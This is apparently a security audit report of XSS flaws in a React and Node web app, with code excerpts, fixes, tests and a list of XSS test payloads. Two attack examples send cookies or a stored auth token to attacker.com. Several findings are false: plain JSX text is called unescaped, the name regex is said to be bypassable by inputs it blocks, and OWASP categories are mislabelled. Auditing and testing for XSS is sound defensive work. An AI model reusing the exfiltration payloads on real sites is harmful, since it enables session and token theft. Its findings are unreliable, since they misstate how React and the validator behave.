# XSS Vulnerability Assessment Report - SwayFiles Codebase

**Assessment Date**: November 12, 2025
**Project**: SwayFiles  
**Severity Levels**: Critical, High, Medium

---

## Executive Summary

A comprehensive security audit of the SwayFiles codebase has identified **multiple XSS vulnerabilities** ranging from Critical to Medium severity. The primary vulnerabilities exist in:

1. **Frontend comment rendering** (CRITICAL)
2. **Activity feed description rendering** (HIGH)
3. **User input validation gaps** (HIGH)
4. **Insufficient sanitization in comments endpoint** (HIGH)

---

## CRITICAL VULNERABILITIES

### 1. XSS in Comment Rendering - SectionBlock Component

**File**: `/Users/wjc2007/Desktop/sway/web/src/components/SectionBlock.jsx`  
**Lines**: 394, 380  
**Severity**: CRITICAL

**Vulnerable Code**:
```jsx
{comment.content}  // Line 394 - Direct rendering without escaping
{comment.author}   // Line 380 - Direct rendering without escaping
```

**Full Context**:
```jsx
// Lines 361-398
comments.map(comment => (
  <div key={comment.id} style={{ padding: '6px 0', borderBottom: '1px solid #222222' }}>
    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '2px' }}>
      <span style={{ fontSize: '10px', color: '#999999', fontWeight: 'bold' }}>
        {comment.author}  {/* VULNERABLE - No HTML escaping */}
      </span>
      <span style={{ fontSize: '9px', color: '#666666' }}>
        {new Date(comment.createdAt).toLocaleString()}
      </span>
    </div>
    <div style={{ fontSize: '11px', color: '#ffffff', lineHeight: '1.4' }}>
      {comment.content}  {/* VULNERABLE - No HTML escaping */}
    </div>
  </div>
))
```

**Attack Vector**: Stored XSS  
- Attacker posts comment: `<img src=x onerror="alert('XSS')">`
- Comment is stored in database via `/api/workflow/sections/:id/comments` endpoint
- When comment is retrieved and rendered, JavaScript executes

**Impact**:
- Session hijacking via cookie theft
- Malware injection
- Credential harvesting
- Defacement
- User account compromise

**Recommendation**: Use DOMPurify or React's default escaping

---

### 2. XSS in Comment Text Storage - Workflow Comments Endpoint

**File**: `/Users/wjc2007/Desktop/sway/backend/src/routes/workflow.js`  
**Lines**: 384-389  
**Severity**: CRITICAL

**Vulnerable Code**:
```javascript
// Lines 384-389
const commentResult = await pool.query(`
  INSERT INTO section_comments
  (section_id, commenter_id, comment_text, comment_type, line_number, highlighted_text, parent_comment_id)
  VALUES ($1, $2, $3, $4, $5, $6, $7)
  RETURNING *
`, [sectionId, userId, comment_text.trim(), comment_type, line_number, highlighted_text, parent_comment_id])
```

**Issue**: 
- `comment_text` is passed directly to database with only `.trim()` applied
- No HTML sanitization or XSS filtering
- Backend validation middleware is NOT applied to this endpoint
- The validation.js middleware includes XSS library but is not used for comment endpoints

**Attack Vector**:
```javascript
POST /api/workflow/sections/{sectionId}/comments
Content-Type: application/json

{
  "comment_text": "<script>fetch('https://attacker.com/steal?cookies=' + document.cookie)</script>",
  "comment_type": "general"
}
```

**Impact**: Stored XSS affecting all users who view the comment

---

## HIGH SEVERITY VULNERABILITIES

### 3. User Data in Activity Feed Without Escaping

**File**: `/Users/wjc2007/Desktop/sway/web/src/components/RightPanel.jsx`  
**Lines**: 101, 110  
**Severity**: HIGH

**Vulnerable Code**:
```jsx
// Line 101
<div style={{ fontSize: '11px', color: '#ffffff', lineHeight: '1.3', marginBottom: '2px' }}>
  {activity.description}  {/* No HTML escaping */}
</div>

// Line 110
<span>{activity.user}</span>  {/* No HTML escaping */}
```

**Issue**: Activity descriptions and usernames rendered directly without sanitization

**Attack Vector**: If activity.description contains: `<img src=x onerror="alert('XSS')">`

---

### 4. Section Title and Content Rendering Without Escaping

**File**: `/Users/wjc2007/Desktop/sway/web/src/components/SectionBlock.jsx`  
**Lines**: 173, 327  
**Severity**: HIGH

**Vulnerable Code**:
```jsx
// Line 173 - Section Title
<h3 style={{ fontSize: '16px', fontWeight: 'bold', color: '#ffffff', margin: 0, cursor: 'pointer' }}>
  {section.title}  {/* No escaping */}
</h3>

// Line 327 - Section Content
<div style={{ minHeight: '60px', padding: '8px', border: '1px solid transparent', fontSize: '12px', lineHeight: '1.5', color: section.content ? '#ffffff' : '#666666', cursor: 'text', whiteSpace: 'pre-wrap' }}>
  {section.content || 'Click to add content...'}  {/* No escaping */}
</div>
```

**Attack Vector**: Store malicious script in section.title or section.content

---

### 5. Insufficient Input Validation for User Names

**File**: `/Users/wjc2007/Desktop/sway/backend/src/routes/uploads.js`  
**Lines**: 147-154  
**Severity**: HIGH

**Vulnerable Code**:
```javascript
function validateName(name) {
  if (!name || typeof name !== 'string') return false
  const trimmed = name.trim()
  if (trimmed.length < 1 || trimmed.length > 100) return false
  // Remove potential XSS characters
  if (/<|>|&|"|'|script/i.test(trimmed)) return false  {/* REGEX IS TOO SIMPLE */}
  return true
}
```

**Issues**:
- Basic regex check `/<|>|&|"|'|script/i` is insufficient
- Can be bypassed with: `<IMG SRC=x onerror=alert('XSS')>`
- Can be bypassed with: `<svg/onload=alert('XSS')>`
- Can be bypassed with: `<body onload=alert('XSS')>`
- No XSS library usage (unlike validation.js which uses 'xss' package)

---

### 6. Activity Metadata Stored Unvalidated

**File**: `/Users/wjc2007/Desktop/sway/backend/src/routes/activity.js`  
**Lines**: 16-67  
**Severity**: HIGH

**Vulnerable Code**:
```javascript
const getActivityDescription = (action, metadata, actorName) => {
  const descriptions = {
    'project_shared': `${actorName} shared project with ${metadata.shared_with}`,
    'collaboration_created': `${actorName} started collaboration with ${metadata.collaborator_email}`,
    'review_assigned': `${actorName} assigned review to ${metadata.reviewer_email}`,
    // ... more template strings
  }
  return descriptions[action] || `${actorName} performed ${action.replace(/_/g, ' ')}`
}
```

**Issue**: Template strings directly concatenate user-controlled data (metadata values, actorName) without escaping

---

### 7. Missing Validation on Comment Review Endpoint

**File**: `/Users/wjc2007/Desktop/sway/backend/src/routes/workflow.js`  
**Lines**: 280-292  
**Severity**: HIGH

**Vulnerable Code**:
```javascript
// Lines 280-292
const reviewResult = await client.query(`
  INSERT INTO section_reviews
  (section_id, reviewer_id, review_status, review_notes, review_score, is_final_approval)
  VALUES ($1, $2, $3, $4, $5, $6)
  ON CONFLICT (section_id, reviewer_id)
  DO UPDATE SET
    review_status = EXCLUDED.review_status,
    review_notes = EXCLUDED.review_notes,
    review_score = EXCLUDED.review_score,
    is_final_approval = EXCLUDED.is_final_approval,
    reviewed_at = CURRENT_TIMESTAMP
  RETURNING *
`, [sectionId, userId, review_status, review_notes, review_score, is_final_approval])
```

**Issue**: `review_notes` parameter (line 252) is not validated or sanitized

**Attack Vector**:
```javascript
POST /api/workflow/sections/{sectionId}/review
{
  "review_status": "approved",
  "review_notes": "<img src=x onerror=\"fetch('https://attacker.com/?data=' + btoa(localStorage.getItem('token')))\">"
}
```

---

## MEDIUM SEVERITY VULNERABILITIES

### 8. Insufficient Middleware Coverage

**File**: `/Users/wjc2007/Desktop/sway/backend/src/routes/workflow.js`  
**Severity**: MEDIUM

**Issue**: The validation middleware with XSS protection defined in `/backend/src/middleware/validation.js` is imported but NOT applied to comment and review endpoints:

```javascript
// validation.js exports:
const validateProjects = {
  create: validateInput(validationSchemas.projects.create),
  update: validateInput(validationSchemas.projects.update)
}
```

**Gap**: `validateComments` is never defined or used, leaving comment endpoints unprotected

---

### 9. Highlighted Text Parameter Not Validated

**File**: `/Users/wjc2007/Desktop/sway/backend/src/routes/workflow.js`  
**Line**: 359  
**Severity**: MEDIUM

**Vulnerable Code**:
```javascript
const {
  comment_text,
  comment_type = 'general',
  line_number,
  highlighted_text,  {/* No validation */}
  parent_comment_id = null
} = req.body

// ... stored directly to database
[sectionId, userId, comment_text.trim(), comment_type, line_number, highlighted_text, parent_comment_id]
```

---

### 10. Error Messages May Leak User Input

**File**: `/Users/wjc2007/Desktop/sway/web/src/components/EditRequestManager.jsx`  
**Severity**: MEDIUM (Low Impact)

**Pattern**: Error states display user input without sanitization
```jsx
{error && (
  <div>{error}</div>  {/* Could contain user input */}
)}
```

---

## FINDINGS SUMMARY TABLE

| Vulnerability | Location | Type | Severity | Status |
|---------------|----------|------|----------|--------|
| Comment content rendering | SectionBlock.jsx:394 | Stored XSS | CRITICAL | Unfixed |
| Comment storage validation | workflow.js:384-389 | Stored XSS | CRITICAL | Unfixed |
| Activity description rendering | RightPanel.jsx:101 | Stored XSS | HIGH | Unfixed |
| Section title rendering | SectionBlock.jsx:173 | Stored XSS | HIGH | Unfixed |
| Name validation regex | uploads.js:152 | Bypass | HIGH | Unfixed |
| Activity metadata injection | activity.js:16-67 | Reflected XSS | HIGH | Unfixed |
| Review notes validation | workflow.js:252 | Stored XSS | HIGH | Unfixed |
| Missing middleware coverage | workflow.js | Design Gap | MEDIUM | Unfixed |
| Highlighted text validation | workflow.js:359 | Stored XSS | MEDIUM | Unfixed |

---

## POSITIVE SECURITY FINDINGS

### What's Working Well:

1. **Helmet.js Implementation** (`/backend/src/middleware/security.js`)
   - CSP headers properly configured
   - XSS filter enabled
   - HSTS preload enabled
   - Proper CORS configuration

2. **Input Validation Library**
   - XSS package properly integrated in validation.js
   - `sanitizeString()` uses `xss` library correctly
   - Strong password validation
   - UUID format validation

3. **File Upload Security** (`/backend/src/routes/uploads.js`, `/backend/src/utils/security.js`)
   - File signature validation
   - Executable content detection
   - Blocked file extensions list
   - Filename sanitization with character replacement

4. **Rate Limiting** (All routes)
   - Comprehensive rate limiting on all endpoints
   - Progressive delay mechanisms
   - Brute force protection

5. **CSRF Protection**
   - CSRF middleware exists and is applied
   - Token validation in place

6. **Authentication Security**
   - Bcrypt hashing for passwords
   - JWT token generation
   - Secure password complexity requirements

---

## REMEDIATION RECOMMENDATIONS

### Priority 1: CRITICAL (Implement Immediately)

#### 1. Install DOMPurify
```bash
npm install --save dompurify
npm install --save-dev @types/dompurify  # if using TypeScript
```

#### 2. Create XSS Sanitization Utility (Frontend)
```javascript
// /web/src/utils/sanitize.js
import DOMPurify from 'dompurify'

export const sanitizeHTML = (dirty) => {
  return DOMPurify.sanitize(dirty, { 
    ALLOWED_TAGS: [], 
    ALLOWED_ATTR: [] 
  })
}

export const sanitizeUserInput = (input) => {
  if (!input) return ''
  return DOMPurify.sanitize(String(input), {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: []
  })
}
```

#### 3. Update SectionBlock Component
```jsx
// Add import
import { sanitizeUserInput } from '../utils/sanitize'

// Update rendering (lines 173, 327, 394)
// Instead of: {section.title}
// Use: {sanitizeUserInput(section.title)}

// Instead of: {comment.content}
// Use: {sanitizeUserInput(comment.content)}

// Instead of: {comment.author}
// Use: {sanitizeUserInput(comment.author)}
```

#### 4. Apply Backend Sanitization Middleware to Workflow Comments
```javascript
// In /backend/src/routes/workflow.js, line 351
const { sanitizeString } = require('../middleware/validation')

router.post('/sections/:id/comments', authenticateToken, workflowLimiter, async (req, res) => {
  try {
    const userId = req.userId
    const sectionId = req.params.id
    let {
      comment_text,
      comment_type = 'general',
      line_number,
      highlighted_text,
      parent_comment_id = null
    } = req.body

    // SANITIZE INPUT
    comment_text = sanitizeString(comment_text)
    highlighted_text = highlighted_text ? sanitizeString(highlighted_text) : null
    
    if (!comment_text || comment_text.trim().length === 0) {
      return res.status(400).json({ error: 'Comment text is required' })
    }
    
    // ... rest of endpoint
```

#### 5. Update Review Notes Validation
```javascript
// In /backend/src/routes/workflow.js, line 250
const { sanitizeString } = require('../middleware/validation')

router.post('/sections/:id/review', authenticateToken, workflowLimiter, async (req, res) => {
  const client = await pool.connect()
  try {
    // ... existing code ...
    let { review_status, review_notes = '', review_score, is_final_approval = false } = req.body
    
    // SANITIZE review_notes
    review_notes = sanitizeString(review_notes)
    
    // Validate review status
    if (!['pending', 'reviewing', 'changes_requested', 'approved', 'rejected'].includes(review_status)) {
      throw new Error('Invalid review status')
    }
    // ... rest of endpoint
```

#### 6. Improve Name Validation
```javascript
// In /backend/src/routes/uploads.js, replace validateName function
const { sanitizeString } = require('../utils/security')  // Add this import

function validateName(name) {
  if (!name || typeof name !== 'string') return false
  
  // Sanitize first
  const sanitized = sanitizeString(name)
  
  // Then validate length
  if (sanitized.length < 1 || sanitized.length > 100) return false
  
  return true
}
```

### Priority 2: HIGH (Implement within 1-2 sprints)

#### 7. Update RightPanel Component
```jsx
import { sanitizeUserInput } from '../utils/sanitize'

// Line 101
<div style={{ fontSize: '11px', color: '#ffffff', lineHeight: '1.3', marginBottom: '2px' }}>
  {sanitizeUserInput(activity.description)}
</div>

// Line 110
<span>{sanitizeUserInput(activity.user)}</span>
```

#### 8. Create Comment Validation Schema
```javascript
// In /backend/src/middleware/validation.js

const validationSchemas = {
  // ... existing schemas ...
  
  comments: {
    create: {
      comment_text: { type: 'string', maxLength: 5000, required: true },
      comment_type: { type: 'enum', values: ['general', 'suggestion', 'issue'], required: true },
      highlighted_text: { type: 'string', maxLength: 1000 },
      line_number: { type: 'integer', min: 0 },
      parent_comment_id: { type: 'uuid' }
    }
  }
}

const validateComments = {
  create: validateInput(validationSchemas.comments.create)
}
```

#### 9. Apply Comment Validation Middleware
```javascript
// In /backend/src/routes/workflow.js
const { validateComments } = require('../middleware/validation')

// Update endpoint signature:
router.post('/sections/:id/comments', 
  authenticateToken, 
  workflowLimiter, 
  validateComments.create,  // ADD THIS
  async (req, res) => {
```

#### 10. Sanitize Activity Descriptions
```javascript
// In /backend/src/routes/activity.js
const { sanitizeString } = require('../utils/security')

const getActivityDescription = (action, metadata, actorName) => {
  // Sanitize inputs first
  const safeName = sanitizeString(actorName)
  const safeAction = sanitizeString(action)
  
  // Sanitize all metadata values
  const safeMetadata = {}
  for (const [key, value] of Object.entries(metadata || {})) {
    safeMetadata[key] = typeof value === 'string' ? sanitizeString(value) : value
  }
  
  const descriptions = {
    'project_shared': `${safeName} shared project with ${safeMetadata.shared_with || 'unknown'}`,
    // ... etc
  }
  
  return descriptions[action] || `${safeName} performed ${safeAction.replace(/_/g, ' ')}`
}
```

### Priority 3: MEDIUM (Implement within 3 months)

#### 11. Add EnhancedSectionBlock Sanitization
Check `/web/src/components/EnhancedSectionBlock.jsx` for same vulnerabilities and apply fixes

#### 12. Implement Content Security Policy Level 2
- Upgrade CSP in security.js from Level 1 to Level 2
- Add nonce-based inline script allowance

#### 13. Add Automated Security Testing
```javascript
// Create /backend/tests/security.test.js
describe('XSS Protection', () => {
  test('Comment endpoints reject XSS payloads', async () => {
    const xssPayload = '<img src=x onerror="alert(1)">'
    const res = await request(app)
      .post('/api/workflow/sections/123/comments')
      .send({ comment_text: xssPayload })
    
    expect(res.status).toBe(400)
    expect(res.body.error).toBeDefined()
  })
})
```

#### 14. Add Frontend XSS Test Suite
```javascript
// Create /web/src/__tests__/xss.test.jsx
import { sanitizeUserInput } from '../utils/sanitize'

describe('XSS Prevention', () => {
  test('sanitizeUserInput removes script tags', () => {
    const xss = '<script>alert("XSS")</script>Hello'
    expect(sanitizeUserInput(xss)).toBe('Hello')
  })
  
  test('sanitizeUserInput removes event handlers', () => {
    const xss = '<img src=x onerror="alert(1)">'
    expect(sanitizeUserInput(xss)).toBe('')
  })
})
```

---

## TESTING PAYLOADS FOR VALIDATION

### XSS Payloads to Test Against:

```
Basic:
- <script>alert('XSS')</script>
- <img src=x onerror="alert('XSS')">
- <svg/onload=alert('XSS')>

Encoded:
- <img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
- %3Cscript%3Ealert('XSS')%3C/script%3E

Case Variations:
- <SCRIPT>alert('XSS')</SCRIPT>
- <IMG SRC=x ONERROR="alert('XSS')">
- <iMg SrC=x OnErRoR="alert('XSS')">

Tag Variations:
- <body onload=alert('XSS')>
- <input onfocus=alert('XSS') autofocus>
- <marquee onstart=alert('XSS')>
```

---

## COMPLIANCE CHECKS

### OWASP Top 10 2021 Coverage:
- **A03:2021 – Injection**: ADDRESSED via sanitization
- **A07:2021 – Cross-Site Scripting**: CRITICAL FINDINGS
- **A01:2021 – Broken Access Control**: Partially addressed
- **A05:2021 – Broken Access Control**: Rate limiting in place

### CWE Coverage:
- **CWE-79**: Improper Neutralization of Input During Web Page Generation
- **CWE-80**: Improper Neutralization of Script-Related HTML Tags
- **CWE-87**: Improper Neutralization of Alternate XSS Vectors

---

## DEPLOYMENT CHECKLIST

- [ ] Install DOMPurify package
- [ ] Create sanitization utility
- [ ] Update all comment rendering in frontend
- [ ] Apply backend sanitization to comments endpoint
- [ ] Apply backend sanitization to review notes endpoint
- [ ] Improve name validation regex
- [ ] Create and apply comment validation schema
- [ ] Update activity rendering
- [ ] Add automated XSS tests
- [ ] Run security audit tools (OWASP ZAP, Burp Suite)
- [ ] Perform penetration testing
- [ ] Update security documentation
- [ ] Training for development team

---

## REFERENCES

- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- DOMPurify Library: https://github.com/cure53/DOMPurify
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- React Security: https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml

---

**Report Generated**: November 12, 2025  
**Assessment Status**: ACTIVE VULNERABILITIES FOUND  
**Remediation Priority**: CRITICAL AND HIGH SEVERITY ISSUES REQUIRE IMMEDIATE ACTION
